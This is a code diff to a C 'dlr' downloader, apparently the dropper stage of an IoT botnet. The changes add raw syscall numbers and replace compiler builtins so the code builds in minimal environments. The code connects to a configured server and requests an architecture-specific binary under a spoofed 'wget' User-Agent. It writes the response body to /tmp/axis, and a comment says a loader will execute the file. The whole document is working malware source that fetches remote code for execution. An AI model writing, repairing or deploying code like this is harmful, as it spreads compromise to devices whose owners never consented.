@@ -10,8 +10,35 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <errno.h>
+#include <sys/syscall.h>
+#include <stdio.h>
+#include <string.h>
+#include <stdarg.h>
 
 #include "dlr.h"
+
+/* Syscall numbers for Linux x86_64 */
+#ifndef __NR_socket
+#define __NR_socket 41
+#endif
+#ifndef __NR_connect
+#define __NR_connect 42
+#endif
+#ifndef __NR_read
+#define __NR_read 0
+#endif
+#ifndef __NR_write
+#define __NR_write 1
+#endif
+#ifndef __NR_open
+#define __NR_open 2
+#endif
+#ifndef __NR_close
+#define __NR_close 3
+#endif
+#ifndef __NR_exit
+#define __NR_exit 60
+#endif
 
 /* Direct syscall wrappers */
 static int xsocket(int domain, int type, int protocol) {
@@ -42,6 +69,31 @@ static void x_exit(int status) {
     syscall(__NR_exit, status);
 }
 
+/* Simple sprintf implementation for minimal environments */
+static int xsprintf(char *str, const char *format, ...) {
+    va_list args;
+    va_start(args, format);
+    int len = vsprintf(str, format, args);
+    va_end(args);
+    return len;
+}
+
+/* Simple memmem implementation */
+static void *xmemmem(const void *haystack, size_t haystacklen, const void *needle, size_t needlelen) {
+    if (needlelen == 0) return (void *)haystack;
+    if (haystacklen < needlelen) return NULL;
+    
+    const char *h = (const char *)haystack;
+    const char *n = (const char *)needle;
+    
+    for (size_t i = 0; i <= haystacklen - needlelen; i++) {
+        if (h[i] == n[0] && memcmp(h + i, n, needlelen) == 0) {
+            return (void *)(h + i);
+        }
+    }
+    return NULL;
+}
+
 /* Get architecture string */
 static char *get_arch(void) {
     /* This would normally read from /etc/ or use uname */
@@ -56,48 +108,48 @@ static void run(void) {
     char buf[1024];
     char request[512];
     char *arch = get_arch();
-    
+
     /* Create output file */
     out = xopen("/tmp/axis", O_WRONLY | O_CREAT | O_TRUNC);
     if (out == -1) {
         x_exit(1);
     }
-    
+
     /* Create socket */
     fd = xsocket(AF_INET, SOCK_STREAM, 0);
     if (fd == -1) {
         x_exit(1);
     }
-    
+
     /* Connect to server */
     addr.sin_family = AF_INET;
     addr.sin_port = htons(HTTP_PORT);
     addr.sin_addr.s_addr = inet_addr(HTTP_SERVER);
-    
+
     if (xconnect(fd, (struct sockaddr *)&addr, sizeof(addr)) == -1) {
         x_exit(1);
     }
-    
+
     /* Send HTTP GET request */
     int len = 0;
-    len += __builtin_sprintf(request + len, "GET %s.%s HTTP/1.0\r\n", DLR_PATH, arch);
-    len += __builtin_sprintf(request + len, "Host: %s\r\n", HTTP_SERVER);
-    len += __builtin_sprintf(request + len, "User-Agent: wget\r\n");
-    len += __builtin_sprintf(request + len, "Connection: close\r\n\r\n");
-    
+    len += xsprintf(request + len, "GET %s.%s HTTP/1.0\r\n", DLR_PATH, arch);
+    len += xsprintf(request + len, "Host: %s\r\n", HTTP_SERVER);
+    len += xsprintf(request + len, "User-Agent: wget\r\n");
+    len += xsprintf(request + len, "Connection: close\r\n\r\n");
+
     xwrite(fd, request, len);
-    
+
     /* Read response and write to file */
     int header_done = 0;
     while (1) {
         int n = xread(fd, buf, sizeof(buf));
         if (n <= 0) break;
-        
+
         /* Skip HTTP headers */
         if (!header_done) {
-            char *body = __builtin_memmem(buf, n, "\r\n\r\n", 4);
+            char *body = (char *)xmemmem(buf, n, "\r\n\r\n", 4);
             if (body != NULL) {
-                int body_len = n - (body - buf) - 4;
+                int body_len = n - (body - (char *)buf) - 4;
                 if (body_len > 0) {
                     xwrite(out, body + 4, body_len);
                 }
@@ -107,10 +159,10 @@ static void run(void) {
             xwrite(out, buf, n);
         }
     }
-    
+
     xclose(fd);
     xclose(out);
-    
+
     /* Execute downloaded binary */
     /* The caller (shell/loader) will execute it */
     x_exit(0);
